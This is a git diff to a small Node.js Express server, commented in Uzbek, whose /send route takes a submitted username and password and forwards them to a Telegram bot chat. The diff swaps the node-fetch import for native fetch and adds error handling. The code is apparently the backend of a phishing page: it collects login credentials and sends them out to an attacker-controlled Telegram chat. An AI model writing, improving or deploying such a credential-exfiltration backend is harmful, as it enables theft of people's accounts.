@@ -1,5 +1,4 @@
 import express from "express";
-import fetch from "node-fetch";
 
 const app = express();
 app.use(express.urlencoded({ extended: true }));
@@ -13,17 +12,26 @@ const CHAT_ID = "7527317470";
 app.post("/send", async (req, res) => {
   const { username, password } = req.body;
 
-  // Telegramga yuborish
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: `📩 Yangi ma'lumot:\n👤 Username: ${username}\n🔑 Password: ${password}`
-    })
-  });
+  try {
+    // Telegramga yuborish
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `📩 Yangi ma'lumot:\n👤 Username: ${username}\n🔑 Password: ${password}`
+      })
+    });
 
-  res.send("OK");
+    if (!response.ok) {
+      throw new Error(`Telegram API xatosi: ${response.status}`);
+    }
+
+    res.send("✅ Ma'lumot yuborildi!");
+  } catch (err) {
+    console.error("Xato:", err);
+    res.status(500).send("❌ Xato yuz berdi");
+  }
 });
 
 app.listen(3000, () => console.log("✅ Server ishlayapti 3000-portda"));
